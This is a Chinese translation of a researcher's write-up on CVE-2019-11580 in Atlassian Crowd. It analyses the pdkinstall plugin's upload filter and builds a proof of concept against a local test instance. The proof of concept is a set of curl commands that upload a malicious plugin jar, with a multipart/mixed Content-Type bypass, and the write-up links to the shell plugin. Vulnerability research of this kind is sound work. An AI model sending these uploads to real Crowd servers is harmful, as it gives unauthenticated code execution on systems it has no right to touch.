> 原文链接: https://www.anquanke.com//post/id/182118 


# CVE-2019-11580：Atlassian Crowd RCE漏洞分析


                                阅读量   
                                **231320**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者corben，文章来源：corben.io
                                <br>原文地址：[https://www.corben.io/atlassian-crowd-rce/](https://www.corben.io/atlassian-crowd-rce/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t012d8453a9f61f9b01.jpg)](https://p1.ssl.qhimg.com/t012d8453a9f61f9b01.jpg)



## 0x00 前言

最近我在渗透测试过程中，遇到了一个[Atlassian Crowd](https://www.atlassian.com/software/crowd)环境。根据官方描述，Crowd是一个集中式身份管理应用，可以帮助企业“管理来自多个目录的用户，比如活动目录（AD）、LDAP、OpenLDAP或者Microsoft Azure AD，也可以在同一个位置来控制应用程序的身份认证权限”。

目标环境安装的Crowd版本较老，因此我向Google伸出援手，想搜搜该版本有没有漏洞，这里我找到了一处[安全公告](https://confluence.atlassian.com/crowd/crowd-security-advisory-2019-05-22-970260700.html)：“`pdkinstall`开发插件未正确启用漏洞（CVE-2019-11580）”。

Atlassian的描述如下：

> “Crowd以及Crowd Data Center在发布版（release）中没有正确启用`pdkinstall`开发插件。如果攻击者向Crowd或者Crowd Data Center实例发送未授权或者已授权的请求，就可以利用该漏洞来安装任意插件。如果目标系统上运行存在漏洞的Crowd或者Crowd Data Center，那么攻击者可以通过该漏洞实现远程代码执行（RCE）”。

经过一番搜索后，我并没有找到该漏洞对应的PoC，因此我决定分析漏洞，尝试自己构建PoC。



## 0x01 代码分析

首先clone该插件的[源代码](https://bitbucket.org/atlassian/pdkinstall-plugin)：

```
root@doggos:~# git clone https://bitbucket.org/atlassian/pdkinstall-plugin
Cloning into 'pdkinstall-plugin'...
remote: Counting objects: 210, done.
remote: Compressing objects: 100% (115/115), done.
remote: Total 210 (delta 88), reused 138 (delta 56)
Receiving objects: 100% (210/210), 26.20 KiB | 5.24 MiB/s, done.
Resolving deltas: 100% (88/88), done.
```

插件的描述文件路径为`./main/resources/atlassian-plugin.xml`，每个插件都需要搭配一个插件描述文件，根据[Atlassian](https://developer.atlassian.com/server/confluence/creating-your-plugin-descriptor/)官方介绍，其中包含XML格式数据，用来“描述托管应用所需的插件以及插件中的模块”。

来看一下该文件内容：

```
&lt;atlassian-plugin name="$`{`project.name`}`" key="com.atlassian.pdkinstall" pluginsVersion="2"&gt;
&lt;plugin-info&gt;
    &lt;version&gt;$`{`project.version`}`&lt;/version&gt;
    &lt;vendor name="Atlassian Software Systems Pty Ltd" url="http://www.atlassian.com"/&gt;
&lt;/plugin-info&gt;

&lt;servlet-filter name="pdk install" key="pdk-install" class="com.atlassian.pdkinstall.PdkInstallFilter" location="before-decoration"&gt;
    &lt;url-pattern&gt;/admin/uploadplugin.action&lt;/url-pattern&gt;
&lt;/servlet-filter&gt;

&lt;servlet-filter name="pdk manage" key="pdk-manage" class="com.atlassian.pdkinstall.PdkPluginsFilter"
    location="before-decoration"&gt;
    &lt;url-pattern&gt;/admin/plugins.action&lt;/url-pattern&gt;
&lt;/servlet-filter&gt;

&lt;servlet-context-listener key="fileCleanup" class="org.apache.commons.fileupload.servlet.FileCleanerCleanup" /&gt;
&lt;component key="pluginInstaller" class="com.atlassian.pdkinstall.PluginInstaller" /&gt;
&lt;/atlassian-plugin&gt;
```

从中可知，当访问`/admin/uploadplugin.action`时，就会调用`com.atlassian.pdkinstall.PdkInstallFilter`这个Java servlet类。由于我们知道这个RCE漏洞由任意插件安装问题所触发，因此我们首先需要看一下[PdkInstallFilter servlet](https://bitbucket.org/atlassian/pdkinstall-plugin/src/master/src/main/java/com/atlassian/pdkinstall/PdkInstallFilter.java)的源代码。

这里我们可以将pdkinstall-plugin导入IntelliJ中，开始分析源代码。我们可以从`doFilter()`方法开始分析。

从[此处代码](https://bitbucket.org/atlassian/pdkinstall-plugin/src/9ea4e8638bd917af879a4f1b5f5bae05fc2733c8/src/main/java/com/atlassian/pdkinstall/PdkInstallFilter.java#lines-57)中可知，如果请求的方法不是POST方法，那么代码就会退出，返回一个错误响应：

```
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException `{`
HttpServletRequest req = (HttpServletRequest) servletRequest;
HttpServletResponse res = (HttpServletResponse) servletResponse;

if (!req.getMethod().equalsIgnoreCase("post"))
`{`
    res.sendError(HttpServletResponse.SC_BAD_REQUEST, "Requires post");
    return;
`}`
```

接下来，代码会判断请求中是否包含multipart数据。Multipart数据是包含一个或多个数据集组合的body数据。如果请求中包含multipart数据，那么代码就会调用`extractJar()`方法来提取请求所发送的jar，否则就会调用`buildJarFromFiles()`方法，尝试从请求数据中构建出一个jar插件文件。

```
// Check that we have a file upload request
File tmp = null;
boolean isMultipart = ServletFileUpload.isMultipartContent(req);
if (isMultipart)
`{`
    tmp = extractJar(req, res, tmp);
`}`
else
`{`
    tmp = buildJarFromFiles(req);
`}`
```

接下来开始分析`extractJar()`方法。

```
private File extractJar(HttpServletRequest req, HttpServletResponse res, File tmp) throws IOException
`{`
    // Create a new file upload handler
    ServletFileUpload upload = new ServletFileUpload(factory);

    // Parse the request
    try `{`
        List&lt;FileItem&gt; items = upload.parseRequest(req);
        for (FileItem item : items)
        `{`
            if (item.getFieldName().startsWith("file_") &amp;&amp; !item.isFormField())
            `{`
                tmp = File.createTempFile("plugindev-", item.getName());
                tmp.renameTo(new File(tmp.getParentFile(), item.getName()));
                item.write(tmp);
            `}`
        `}`
    `}` catch (FileUploadException e) `{`
        log.warn(e, e);
        res.sendError(HttpServletResponse.SC_BAD_REQUEST, "Unable to process file upload");
    `}` catch (Exception e) `{`
        log.warn(e, e);
        res.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "Unable to process file upload");
    `}`
    return tmp;
`}`
```

首先，该函数会实例化`ServletFileUpload`的一个新对象，然后调用[`parseRequest()`](http://commons.apache.org/proper/commons-fileupload/javadocs/api-release/org/apache/commons/fileupload/servlet/ServletFileUpload.html#parseRequest-javax.servlet.http.HttpServletRequest-)方法来解析HTTP请求。该方法会解析HTTP请求中的`multipart/form-data`数据流，并将解析出的[FileItem](http://commons.apache.org/proper/commons-fileupload/javadocs/api-release/index.html)存放到`items`列表中。

对于`FileItem`列表中的每个`item`，如果字段名以`file_`作为前缀，且不是[表单字段](https://commons.apache.org/proper/commons-fileupload/apidocs/org/apache/commons/fileupload/FileItem.html#isFormField--)（即HTML字段），那么该方法就会创建并写入一个文件，将该文件上传到磁盘上的临时目录中。如果操作失败，`tmp`变量的值将为`null`；如果操作成功，`tmp`变量将包含已写入文件的具体路径。代码会将`tmp`变量返回给`doFilter()`方法。

```
if (tmp != null)
`{`
    List&lt;String&gt; errors = new ArrayList&lt;String&gt;();
    try
    `{`
        errors.addAll(pluginInstaller.install(tmp));
    `}`
    catch (Exception ex)
    `{`
        log.error(ex);
        errors.add(ex.getMessage());
    `}`

    tmp.delete();

    if (errors.isEmpty())
    `{`
        res.setStatus(HttpServletResponse.SC_OK);
        servletResponse.setContentType("text/plain");
        servletResponse.getWriter().println("Installed plugin " + tmp.getPath());
    `}`
    else
    `{`
        res.setStatus(HttpServletResponse.SC_BAD_REQUEST);
        servletResponse.setContentType("text/plain");
        servletResponse.getWriter().println("Unable to install plugin:");
        for (String err : errors)
        `{`
            servletResponse.getWriter().println("t - " + err);
        `}`
    `}`
    servletResponse.getWriter().close();
    return;
`}`
res.sendError(HttpServletResponse.SC_BAD_REQUEST, "Missing plugin file");
```

如果`extractJar()`执行成功，`tmp`变量就会被设置为非`null`的其他值。应用程序会尝试使用`pluginInstaller.install()`方法安装插件，捕获安装过程中出现的任何错误。如果没有出现错误，服务端会返回`200 OK`响应，提示插件已成功安装。否则，服务端会响应`400 Bad Request`，提示“Unable to install plugin”（无法安装插件），响应消息中还包含导致安装失败的具体错误。

然而，如果最初的`extractJar()`方法执行失败，`tmp`变量就会被设置为`null`，服务端会返回`400 Bad Request`，提示“Missing plugin file”（插件文件缺失）。

现在我们了解了servlet工作原理及服务端期望收到的请求格式，我们可以尝试构造漏洞利用代码。



## 0x02 构造PoC

### <a class="reference-link" name="%E6%96%B9%E6%B3%951"></a>方法1

首先使用Atlassian SDK启动一个测试实例。

现在确保我们可以通过访问`http://localhost:4990/crowd/admin/uploadplugin.action`来调用`pdkinstall`插件。

服务端应该会返回“400 Bad Request”响应：

[![](https://p0.ssl.qhimg.com/t01bdfa88b2d1cde28a.png)](https://p0.ssl.qhimg.com/t01bdfa88b2d1cde28a.png)

接下来利用我们目前已掌握的信息来上传一个标准插件。我选择来自`atlassian-bundled-plugins`中的[applinks-plugin](https://bitbucket.org/atlassian/application-links/src/master/applinks-plugin/)作为测试对象，大家可以从[此处](https://github.com/lc/research/blob/master/CVE-2019-11580/applinks-plugin-5.2.6.jar)下载已编译好的jar文件。

根据我们了解的信息：servlet希望处理POST请求，请求中包含multipart数据，而multipart数据包含以`file_`开头的文件。我们可以使用cURL的`--form`参数发起满足条件的请求：

```
root@doggos:~# curl --form "file_cdl=@applinks-plugin-5.2.6.jar" http://localhost:4990/crowd/admin/uploadplugin.action -v
```

[![](https://p4.ssl.qhimg.com/t01d1950a846f2304f0.png)](https://p4.ssl.qhimg.com/t01d1950a846f2304f0.png)

从结果中可知，服务端成功安装了插件，因此我们是不是可以创建并安装自己的插件呢？

为了测试方便，我创建了一个恶意插件（访问[此处](https://github.com/lc/research/tree/master/CVE-2019-11580/atlassian-shell)下载）。

接下来编译并尝试上传该插件。

```
root@doggos:~# ./compile.sh
root@doggos:~# curl --form "file_cdl=@rce.jar" http://localhost:8095/crowd/admin/uploadplugin.action -v
```

[![](https://p2.ssl.qhimg.com/t01c0dc808ffec360a2.png)](https://p2.ssl.qhimg.com/t01c0dc808ffec360a2.png)

可以看到服务端会返回“400 Bad Request”错误，响应数据中包含错误消息：“Missing plugin file”。从前文分析可知，如果`tmp`为`null`，那么服务端就会返回完全相同的错误代码及消息，但为什么会出现这种情况呢？我们可以调试一下。

我在IntelliJ中导入了`pdkinstall-plugin`，将调试器attach到Crowd实例，然后打开负责处理上传流程的`PdkInstallFilter.java` servlet。

我首先猜测`ServletFileUpload.isMultipartContent(req)`方法无法执行成功，因此我在该函数设置了一个断点，然后尝试上传我们的恶意插件。然而，我们可以看到该函数会正常运行，并且服务端会将其当成multipart数据：

[![](https://p3.ssl.qhimg.com/t01c6967fe56569943c.png)](https://p3.ssl.qhimg.com/t01c6967fe56569943c.png)

因此肯定是`extractJar()`出了问题。我们可以调试该方法，逐行设置断点，这样方便找到出错的位置。设置断点后，我再次尝试上传：

[![](https://www.corben.io/images/atlassian/extractJar-debugging.gif)](https://www.corben.io/images/atlassian/extractJar-debugging.gif)

可以看到`upload.parseRequest(req)`方法会返回一个空的数组。由于`items`变量为空，因此代码会跳过`for`循环，返回值为`null`的`tmp`。

我花了很长时间，想澄清为什么会出现这种情况，但我并不清楚真正的原因。然而这并不关键，我只关心如何实现RCE。

那么如果我将`Content-Type`从`multipart/form-data`改成其他`multipart`编码，会出现什么情况呢？可以来试一下。

### <a class="reference-link" name="%E6%96%B9%E6%B3%952"></a>方法2

这一次我决定将`Content-Type`改成`multipart/mixed`，尝试上传我的恶意插件。

```
curl -k -H "Content-Type: multipart/mixed" 
  --form "file_cdl=@rce.jar" http://localhost:4990/crowd/admin/uploadplugin.action
```

服务端会在返回数据中提示插件已安装成功：

[![](https://p5.ssl.qhimg.com/t01e9a430a7a153ca39.png)](https://p5.ssl.qhimg.com/t01e9a430a7a153ca39.png)

来看一下我们是否真的可以调用这个恶意插件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01fc4772c33a8396a8.png)

这里我们已经成功针对Atlassian Crowd实现了无需身份认证的远程代码执行（RCE）。



## 0x03 总结

在对这个CVE的整个分析过程中，我所付出的努力都得到了回报，没有浪费时间精力，这正是漏洞分析过程的关键点所在。我们永远不要害怕尝试新事物，也不要害怕失败，这是整个过程最大的收获。

我对Java并不是特别了解，也没有丰富的调试经验，但这些都没有阻止我不断去尝试。尝试新事物、研究新内容、不断排查错误，这也是学习过程的重要过程。
